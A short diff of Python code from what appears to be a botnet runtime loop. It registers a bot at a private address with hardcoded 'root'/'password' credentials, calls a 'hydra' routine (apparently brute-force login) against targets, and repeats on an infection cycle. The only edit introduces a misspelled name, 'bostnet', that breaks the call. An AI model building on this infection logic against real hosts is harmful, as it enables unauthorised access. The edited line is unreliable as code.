@@ -18,7 +18,7 @@ class BotRunTime:
             print('infect')
             botnet.add_bot('10.142.0.3','root','password')
             target = botnet.targets()
-            botnet.hydra(target)
+            bostnet.hydra(target)
             #print(i.host for i in botnet.botnet)
             j=j+1
             await sleep(settings.INFECTION_CYCLE_TIME)
